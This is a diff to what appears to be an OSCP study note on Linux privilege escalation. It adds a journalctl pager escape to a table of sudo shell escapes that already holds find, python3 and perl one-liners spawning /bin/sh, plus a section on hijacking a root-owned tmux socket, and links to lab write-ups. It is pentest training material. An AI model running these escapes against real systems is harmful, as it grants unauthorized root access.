@@ -57,6 +57,7 @@ flowchart TD
 | find | `sudo find / -exec /bin/sh \; -quit` |
 | less | `sudo less /etc/hosts` then `!/bin/sh` |
 | man | `sudo man man` then `!/bin/sh` |
+| journalctl | Reproduce the exact allowed arguments, then enter `!/bin/bash` in the pager |
 | python3 | `sudo python3 -c 'import os; os.system("/bin/sh")'` |
 | perl | `sudo perl -e 'exec "/bin/sh";'` |
 | bash | `sudo bash` |
@@ -396,6 +397,33 @@ Add these checks after step 3 (sudo -l) in the existing checklist:
 | 13 | RUNPATH writable | `readelf -d SUID_binary \| grep runpath` | Writable RUNPATH dir |
 
 #### Tags: #DecisionTree #LinuxPrivesc #SUID #sudo #Capabilities #CronJob #KernelExploit #GTFOBins #Module18 #LXD #Docker #NFS #LDPreload #SharedObject #PythonHijack #DirtyPipe #RestrictedShell #PathAbuse #HTBSupplementary
+## Unix socket and tmux session branch
+
+If local enumeration finds a Unix socket owned by root and readable by the current user, identify whether it is a tmux server before starting a longer exploit hunt.
+
+```bash
+find / -type s -ls 2>/dev/null
+ls -la $SocketDir
+tmux -S $TmuxSocket ls
+tmux -S $TmuxSocket attach-session -t 0
+id
+```
+
+Decision:
+
+```
+readable root-owned socket
+  -> test tmux metadata
+  -> attach only after confirming the socket path
+  -> run id inside the session
+  -> collect root proof and record the session-hijack evidence
+no tmux server
+  -> continue with sudo, SUID, capabilities, cron, service, and kernel branches
+```
+
+> [!warning] 💡
+> A socket path alone is not proof of privilege. Record ownership, mode, tmux metadata, and the identity shown after attach.
+
 ## External Resources
 
 - [HackTricks - Pentesting Index](https://hacktricks.wiki/en/index.html)
@@ -417,6 +445,8 @@ This page turns one repeatable part of an authorized assessment into a checklist
 - [[OSCP/BOXES/WRITE UPS/Linux/Networked|Networked]] -- demonstrates user cron filename injection followed by sudo configuration parsing
 - [[OSCP/BOXES/WRITE UPS/Linux/Covfefe|Covfefe]] -- demonstrates custom SUID source review and adjacent-string privilege escalation
 - [[OSCP/BOXES/WRITE UPS/Linux/TartarSauce|TartarSauce]] -- demonstrates sudo tar checkpoint execution, systemd timer review, archive replacement, and architecture-matched SUID execution
+- [[OSCP/BOXES/WRITE UPS/Linux/Valentine|Valentine]] -- demonstrates a readable root-owned tmux socket as the local privilege path
+- [[OSCP/BOXES/WRITE UPS/Linux/Traceback|Traceback]] -- demonstrates sudo-to-interpreter execution, a writable SSH-triggered MOTD script, and SUID Bash verification
 
 ## Timer and archive trust branch
 
